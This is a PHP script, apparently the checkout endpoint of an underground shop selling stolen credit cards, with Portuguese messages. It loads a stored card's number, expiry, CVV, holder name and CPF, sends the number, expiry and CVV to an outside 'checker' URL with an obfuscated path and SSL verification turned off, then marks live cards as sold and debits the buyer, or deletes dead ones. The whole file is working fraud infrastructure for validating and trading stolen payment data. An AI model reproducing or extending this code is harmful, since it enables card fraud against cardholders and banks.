<?php
require_once("count.php");
date_default_timezone_set('America/Sao_Paulo');
#############################################
$card_token = mysqli_real_escape_string($conexao, $_POST['card_token']);
#############################################
$sql = "SELECT * FROM `cards` WHERE card_token = '$card_token'";
$busca = mysqli_query($conexao, $sql);
$dados = mysqli_fetch_assoc($busca);

#############################################
$card = $dados['card'];
$mes = $dados['mes'];
$ano = $dados['ano'];
$cvv = $dados['cvv'];
$nomecard = $dados['nome'];
$cpfcard = $dados['cpf'];
$banco = $dados['banco'];
$nivel = $dados['nivel'];
$bandeira = $dados['bandeira'];
$valorcc = $dados['valorcc'];
#############################################
if($nomecard == 1){
$dadosnome = "Sem dados";
}
else{
$dadosnome = "$nomecard";
}
#############################################

if($cpfcard == 1){
$dadoscpf = "Sem dados";
}
else{
$dadoscpf = "$cpfcard";
}

#############################################
if($saldo < $valorcc){
$json = ["success" => false, "message" => "Saldo insuficiente"];
die(json_encode($json));
}
#############################################

$email = trim(uniqid());

if(empty($card_token)){
$json = ["success" => false, "message" => "card não identificado."];
die(json_encode($json));
}
#############################################
$order_token = base64_encode(uniqid());
#############################################
$date = date("Y-m-d H:i:s");
$newtimestamp = strtotime(''.$date.' + 10 minute');
$data_atual = date('Y-m-d H:i:s', $newtimestamp);
#############################################

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://filhotemlkfull.com/asfasfjka234dsdaksd-asodfj2342ashfasd-3423-jdaids6tst/api.php?lista='.$card.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array());
$resultado = curl_exec($ch);

if(stripos($resultado, '✅')){
$json = array("success" => true, "message" => "BLACK AGRADECE PELA COMPRAR");
echo json_encode($json);

$sql2 = "INSERT INTO `cardsvendidos` (`card`, `mes`, `ano`, `cvv`, `valorcc`, `nome`, `cpf`, `banco`, `nivel`, `bandeira`, `usuario`, `card_token`, `order_token`, `data_c`) VALUES ('$card','$mes','$ano','$cvv','$valorcc','$dadosnome','$dadoscpf','$banco','$nivel','$bandeira','$usuario','$card_token', '$order_token', '$data_atual')";
$result = mysqli_query($conexao, $sql2);

$sql3 = "DELETE FROM cards WHERE card_token = '$card_token'";
mysqli_query($conexao, $sql3);

debitar($valorcc);
}

else{
$json = array("success" => false, "message" => "CC DIE TENTE OUTRA");
echo json_encode($json);

$sql3 = "DELETE FROM cards WHERE card_token = '$card_token'";
mysqli_query($conexao, $sql3);
}




?>